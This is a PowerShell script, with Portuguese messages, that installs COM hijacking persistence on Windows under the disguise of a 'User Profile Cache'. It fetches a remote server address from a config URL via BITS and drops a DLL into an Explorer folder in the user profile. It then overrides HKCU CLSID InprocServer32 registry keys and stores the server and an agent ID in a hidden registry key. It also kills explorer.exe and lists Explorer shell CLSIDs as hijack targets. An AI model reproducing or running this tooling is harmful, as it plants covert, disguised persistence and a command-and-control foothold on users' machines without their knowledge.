#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [ValidateSet('Install','Uninstall','Register','Unregister','ListClsid')]
    [string]$Action,

    [string]$Config,
    [string]$Clsid,
    [string]$DllPath,
    [string]$SourceDll,

    [ValidateSet('Auto','x64','x86')]
    [string]$Architecture='Auto',

    [switch]$RestartExplorer,
    [switch]$RemoveDll,
    [switch]$UnregisterPrevious,
    [switch]$UseRegAsm,
    [switch]$Force
)

$ErrorActionPreference = 'Stop'

$Script:StateFile = Join-Path $env:TEMP '.profile-sync.last-clsid'
$Script:InstallDllName = 'profilecache.dll'
$Script:ComClassName = 'UserProfileCache.CacheProvider'
$Script:FilelessStoreClsid = '{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'

function Invoke-BitsDownloadString {
    param([string]$Url)
    $tempFile = [System.IO.Path]::GetTempFileName()
    try {
        Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
        return Get-Content $tempFile -Raw -Encoding UTF8
    } finally {
        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
    }
}

function Invoke-BitsDownloadData {
    param([string]$Url)
    $tempFile = [System.IO.Path]::GetTempFileName()
    try {
        Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
        return [System.IO.File]::ReadAllBytes($tempFile)
    } finally {
        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
    }
}

function Get-CscPath {
    param([ValidateSet('Auto','x64','x86')][string]$Arch='Auto')
    $paths = @()
    if ($Arch -eq 'x86') {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
    } elseif ($Arch -eq 'x64') {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
    } else {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
    }
    foreach ($path in $paths) {
        if (Test-Path $path) { return $path }
    }
    throw "csc.exe nao encontrado"
}

function Get-ServerUrl {
    param([string]$Url)
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    } catch {}
    $raw = Invoke-BitsDownloadString -Url $Url
    $srv = $null
    if ($PSVersionTable.PSVersion.Major -ge 3) {
        try {
            $j = $raw | ConvertFrom-Json
            if ($j) { $srv = $j.server }
        } catch {}
    }
    if (-not $srv -and ($raw -match '"server"\s*:\s*"([^"]+)"')) {
        $srv = $matches[1]
    }
    if (-not $srv) { throw "Config missing 'server' key" }
    return $srv.Trim().TrimEnd('/')
}

function Format-ComClsid {
    param([string]$Value)
    $normalized = $Value.Trim('{}').ToUpperInvariant()
    return "{$normalized}"
}

function Get-InstallDllPath {
    return Join-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer') $Script:InstallDllName
}

function Test-FileInUse {
    param([string]$Path)
    if (-not (Test-Path $Path -PathType Leaf)) { return $false }
    try {
        $stream = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
        $stream.Close()
        $stream.Dispose()
        return $false
    } catch {
        return $true
    }
}

function Release-ProfileCacheDllLock {
    param([string]$DllPath, [string]$Clsid)
    if (-not (Test-FileInUse -Path $DllPath)) { return }
    if ($Clsid) {
        $clsid = Format-ComClsid -Value $Clsid
        $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
        if (Test-Path $inprocKey) {
            Remove-Item -Path $inprocKey -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $null = taskkill /f /im explorer.exe 2>&1
    Start-Sleep -Seconds 2
    for ($attempt = 1; $attempt -le 6; $attempt++) {
        if (-not (Test-FileInUse -Path $DllPath)) { return }
        Start-Sleep -Seconds 1
    }
    throw "Nao foi possivel substituir a DLL: $DllPath"
}

function Deploy-InstallDll {
    param([string]$SourcePath, [string]$DestinationPath)
    $destDir = Split-Path -Parent $DestinationPath
    if (-not (Test-Path $destDir)) {
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    }
    Copy-Item -LiteralPath $SourcePath -Destination $DestinationPath -Force
}

function Invoke-CompileBootstrap {
    param([string]$OutputPath, [string]$Arch = 'Auto')
    
    $buildDir = Join-Path $env:TEMP ("upc_" + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $buildDir -Force | Out-Null
    
    try {
        # Código C# mínimo para a DLL COM
        $csCode = @'
using System;
using System.Runtime.InteropServices;

namespace UserProfileCache
{
    [ComVisible(true)]
    [Guid("E8773F22-8D55-4D47-A6BD-8E83CDA3F196")]
    [ProgId("UserProfileCache.Provider")]
    [ClassInterface(ClassInterfaceType.None)]
    public class CacheProvider
    {
        public string GetVersion() { return "1.0.0.0"; }
    }
}
'@
        $csFile = Join-Path $buildDir 'CacheProvider.cs'
        Set-Content -LiteralPath $csFile -Value $csCode -Encoding UTF8
        
        $csc = Get-CscPath -Arch $Arch
        $outDir = Split-Path -Parent $OutputPath
        if (-not (Test-Path $outDir)) {
            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        }
        
        $stagingPath = Join-Path $buildDir 'UserProfileCache.dll'
        $cscArgs = @(
            '/nologo',
            '/target:library',
            '/platform:anycpu',
            "/out:$stagingPath",
            '/reference:System.dll'
        ) + $csFile
        
        & $csc @cscArgs
        
        if ($LASTEXITCODE -ne 0) {
            throw "csc.exe falhou com exit code $LASTEXITCODE"
        }
        
        if (-not (Test-Path $stagingPath -PathType Leaf)) {
            throw "Compilacao nao gerou: $stagingPath"
        }
        
        Deploy-InstallDll -SourcePath $stagingPath -DestinationPath $OutputPath
    } finally {
        if (Test-Path $buildDir) {
            Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function Register-ComHijack {
    param(
        [string]$Path,
        [string]$TargetClsid,
        [string]$Arch = 'Auto',
        [string]$Description = 'User Profile Cache'
    )
    
    $clsid = Format-ComClsid -Value $TargetClsid
    $mscoree = if ($Arch -eq 'x86') { 
        Join-Path $env:WINDIR 'SysWOW64\mscoree.dll' 
    } else { 
        Join-Path $env:WINDIR 'System32\mscoree.dll' 
    }
    
    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
    $inprocKey = Join-Path $clsidKey 'InprocServer32'
    
    New-Item -Path $clsidKey -Force | Out-Null
    Set-ItemProperty -Path $clsidKey -Name '(default)' -Value $Description
    New-Item -Path $inprocKey -Force | Out-Null
    Set-ItemProperty -Path $inprocKey -Name '(default)' -Value $mscoree
    Set-ItemProperty -Path $inprocKey -Name 'ThreadingModel' -Value 'Both'
    
    return [PSCustomObject]@{ Clsid = $clsid }
}

function Unregister-ComHijack {
    param([string]$TargetClsid)
    $clsid = Format-ComClsid -Value $TargetClsid
    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
    if (Test-Path $clsidKey) {
        Remove-Item -Path $clsidKey -Recurse -Force
    }
    return $clsid
}

function Save-OriginalInprocDll {
    param([string]$Clsid, [string]$HkcuClsidKey)
    $hklmInproc = "HKLM:\Software\Classes\CLSID\$Clsid\InprocServer32"
    if (-not (Test-Path $hklmInproc)) { return $null }
    $orig = (Get-ItemProperty -Path $hklmInproc).'(default)'
    if ([string]::IsNullOrWhiteSpace($orig)) { return $null }
    Set-ItemProperty -Path $HkcuClsidKey -Name 'O' -Value $orig -Type String
    return $orig
}

function Sync-FilelessRegistryStore {
    param([string]$ConfigUrl, [string]$ServerBase, [string]$AgentId)
    $storeKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
    New-Item -Path $storeKey -Force | Out-Null
    Set-ItemProperty -Path $storeKey -Name 'C' -Value $ConfigUrl -Type String
    Set-ItemProperty -Path $storeKey -Name 'U' -Value $ServerBase -Type String
    Set-ItemProperty -Path $storeKey -Name 'I' -Value $AgentId -Type String
    Remove-ItemProperty -Path $storeKey -Name 'T' -ErrorAction SilentlyContinue
}

function Get-ProfileCacheHijackInstall {
    param([string]$TargetClsid)
    $destDll = Get-InstallDllPath
    $dllExists = Test-Path $destDll -PathType Leaf
    $clsidRoot = 'HKCU:\Software\Classes\CLSID'
    if (-not (Test-Path $clsidRoot)) { return $null }
    $found = @()
    foreach ($subKey in Get-ChildItem -Path $clsidRoot -ErrorAction SilentlyContinue) {
        $inprocKey = Join-Path $subKey.PSPath 'InprocServer32'
        if (-not (Test-Path $inprocKey)) { continue }
        $inproc = Get-ItemProperty -Path $inprocKey -ErrorAction SilentlyContinue
        if ($inproc.Class -ne $Script:ComClassName) { continue }
        $clsid = Format-ComClsid -Value $subKey.PSChildName
        $clsidProps = Get-ItemProperty -Path $subKey.PSPath -ErrorAction SilentlyContinue
        $found += [PSCustomObject]@{
            Clsid = $clsid
            DllExists = $dllExists
            Config = $clsidProps.C
            Server = $clsidProps.U
            AgentId = $clsidProps.I
        }
    }
    if ($TargetClsid) {
        $formatted = Format-ComClsid -Value $TargetClsid
        return $found | Where-Object { $_.Clsid -eq $formatted } | Select-Object -First 1
    }
    return $found | Select-Object -First 1
}

function Invoke-InstallAction {
    if (-not $Config) { throw "Install requer -Config" }
    if (-not $Clsid) { throw "Install requer -Clsid" }
    
    $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
    if ($existing -and $existing.DllExists -and -not $Force) {
        Write-Host 'Ja instalado'
        return
    }
    
    Write-Host 'Instalando...'
    
    $serverBase = Get-ServerUrl -Url $Config
    $destDll = Get-InstallDllPath
    $installDir = Split-Path -Parent $destDll
    
    if (-not (Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }
    
    Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
    
    if ($SourceDll) {
        if (-not (Test-Path $SourceDll -PathType Leaf)) {
            throw "SourceDll nao encontrada: $SourceDll"
        }
        Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
    } else {
        Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
    }
    
    $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
    
    $agentId = [guid]::NewGuid().ToString('N')
    $clsidKey = "HKCU:\Software\Classes\CLSID\$($result.Clsid)"
    
    Set-ItemProperty -Path $clsidKey -Name 'C' -Value $Config -Type String
    Set-ItemProperty -Path $clsidKey -Name 'U' -Value $serverBase -Type String
    Set-ItemProperty -Path $clsidKey -Name 'I' -Value $agentId -Type String
    
    $origDll = Save-OriginalInprocDll -Clsid $result.Clsid -HkcuClsidKey $clsidKey
    Sync-FilelessRegistryStore -ConfigUrl $Config -ServerBase $serverBase -AgentId $agentId
    
    Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
    
    if ($RestartExplorer) {
        taskkill /f /im explorer.exe 2>$null | Out-Null
        Start-Sleep -Seconds 1
        Start-Process explorer.exe
    }
    
    Write-Host 'Concluido'
}

function Invoke-UninstallAction {
    if (-not $Clsid) { throw "Uninstall requer -Clsid" }
    Write-Host 'Removendo...'
    $removed = Unregister-ComHijack -TargetClsid $Clsid
    
    $storeKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
    if (Test-Path $storeKey) {
        Remove-Item -Path $storeKey -Recurse -Force
    }
    
    if ($RemoveDll) {
        $destDll = Get-InstallDllPath
        Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
        if (Test-Path $destDll) {
            Remove-Item -LiteralPath $destDll -Force
        }
    }
    
    if ($RestartExplorer) {
        $null = taskkill /f /im explorer.exe 2>&1
        Start-Sleep -Seconds 1
        Start-Process explorer.exe
    }
    
    if (Test-Path $Script:StateFile) {
        Remove-Item -Path $Script:StateFile -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host 'Concluido'
}

function Invoke-RegisterAction {
    if (-not $Clsid) { throw "Register requer -Clsid" }
    $targetDll = $DllPath
    if (-not $targetDll) { $targetDll = Get-InstallDllPath }
    if (-not (Test-Path $targetDll -PathType Leaf)) {
        throw "DLL nao encontrada: $targetDll"
    }
    if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
        $previous = (Get-Content -Path $Script:StateFile -Raw).Trim()
        if ($previous) {
            Unregister-ComHijack -TargetClsid $previous | Out-Null
        }
    }
    Write-Host 'Registrando...'
    $result = Register-ComHijack -Path $targetDll -TargetClsid $Clsid -Arch $Architecture
    Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
    Write-Host 'Concluido'
}

function Invoke-UnregisterAction {
    if (-not $Clsid) { throw "Unregister requer -Clsid" }
    Write-Host 'Removendo...'
    $removed = Unregister-ComHijack -TargetClsid $Clsid
    Write-Host 'Concluido'
}

function Invoke-ListClsidAction {
    Write-Host "Listando CLSIDs candidatos..."
    $roots = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers"
    )
    foreach ($root in $roots) {
        if (-not (Test-Path $root)) { continue }
        Write-Host "`n$root" -ForegroundColor Yellow
        Get-ChildItem -Path $root -ErrorAction SilentlyContinue | ForEach-Object {
            $clsid = (Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue).'(default)'
            if ($clsid) {
                Write-Host "  $($_.PSChildName) -> $clsid"
            }
        }
    }
}

switch ($Action) {
    'Install'    { Invoke-InstallAction }
    'Uninstall'  { Invoke-UninstallAction }
    'Register'   { Invoke-RegisterAction }
    'Unregister' { Invoke-UnregisterAction }
    'ListClsid'  { Invoke-ListClsidAction }
}
